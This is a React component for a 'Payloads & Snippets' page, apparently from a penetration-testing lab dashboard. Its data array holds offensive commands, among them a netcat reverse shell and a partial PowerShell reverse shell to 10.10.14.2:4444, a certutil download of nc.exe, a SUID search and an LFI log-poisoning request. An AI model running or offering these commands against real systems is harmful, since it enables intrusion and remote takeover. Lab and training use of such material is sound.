import React from 'react';
import { Terminal, Copy, Plus, Search, Filter } from 'lucide-react';

export default function PayloadsPage() {
  const payloads = [
    { name: "TTY Bash Shell", cmd: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'", type: "Shells", tags: ["Linux", "TTY"] },
    { name: "Reverse Shell (Netcat)", cmd: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.2 4444 >/tmp/f", type: "Reverse Shells", tags: ["Linux", "Netcat"] },
    { name: "HTTP Server (Python3)", cmd: "python3 -m http.server 80", type: "Transfers", tags: ["Utility", "Python"] },
    { name: "Windows Download (Certutil)", cmd: "certutil.exe -urlcache -split -f http://10.10.14.2/nc.exe nc.exe", type: "Transfers", tags: ["Windows", "Download"] },
    { name: "SUID Finder", cmd: "find / -perm -u=s -type f 2>/dev/null", type: "PrivEsc", tags: ["Linux", "SUID"] },
    { name: "LFI to RCE (Log Poisoning)", cmd: "curl -s -X GET http://10.10.11.230/index.php?page=/var/log/apache2/access.log", type: "Web", tags: ["LFI", "Web"] },
    { name: "PowerShell Reverse Shell", cmd: "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"10.10.14.2\",4444);...", type: "Reverse Shells", tags: ["Windows", "PS"] },
  ];

  return (
    <div className="max-w-7xl mx-auto pb-20 animate-in fade-in slide-in-from-bottom-4 duration-500 h-[calc(100vh-120px)] flex flex-col">
      
      <div className="flex items-end justify-between mb-8 flex-shrink-0">
        <div>
          <h1 className="text-3xl font-bold mb-2 flex items-center gap-3">
            <Terminal className="w-8 h-8 text-purple-500" /> Payloads & Snippets
          </h1>
          <p className="text-gray-500 text-sm">Quickly copy your most used commands and exploits.</p>
        </div>
        <div className="flex gap-3">
          <div className="flex items-center gap-2 px-4 py-2 rounded-xl border border-[#1a1a20] bg-[#0c0c0e]">
            <Search className="w-4 h-4 text-gray-500" />
            <input 
              type="text" 
              placeholder="Search payloads..." 
              className="bg-transparent border-none outline-none text-sm text-gray-300 w-48 placeholder-gray-600"
            />
          </div>
          <button className="stakent-btn-primary flex items-center gap-2 !py-2">
            <Plus className="w-4 h-4" /> New Payload
          </button>
        </div>
      </div>

      <div className="stakent-glass flex-1 overflow-hidden flex flex-col">
        {/* Table Header */}
        <div className="grid grid-cols-12 gap-4 px-6 py-4 border-b border-[#1a1a20] bg-[#08080a] rounded-t-[20px] text-xs font-bold text-gray-500 uppercase tracking-wider">
          <div className="col-span-3">Name / Title</div>
          <div className="col-span-5">Command String</div>
          <div className="col-span-2">Category</div>
          <div className="col-span-2 text-right">Actions</div>
        </div>

        {/* Table Body */}
        <div className="flex-1 overflow-y-auto">
          {payloads.map((p, i) => (
            <div key={i} className="grid grid-cols-12 gap-4 px-6 py-4 border-b border-[#1a1a20]/50 hover:bg-white/[0.02] transition items-center group">
              <div className="col-span-3 font-semibold text-gray-200">
                {p.name}
              </div>
              
              <div className="col-span-5">
                <code className="text-xs font-mono text-purple-300 bg-purple-500/10 px-2 py-1 rounded border border-purple-500/20 truncate block max-w-[90%]">
                  {p.cmd}
                </code>
              </div>
              
              <div className="col-span-2 flex flex-wrap gap-2">
                {p.tags.map(t => (
                  <span key={t} className="bg-[#1a1a20] text-gray-400 text-[10px] px-2 py-0.5 rounded border border-[#2a2a30]">
                    {t}
                  </span>
                ))}
              </div>
              
              <div className="col-span-2 flex justify-end">
                <button className="w-8 h-8 rounded-lg bg-[#1a1a20] border border-[#2a2a30] flex items-center justify-center hover:bg-purple-500 hover:border-purple-400 hover:text-white transition group-hover:opacity-100 opacity-50">
                  <Copy className="w-4 h-4" />
                </button>
              </div>
            </div>
          ))}
        </div>
      </div>

    </div>
  );
}
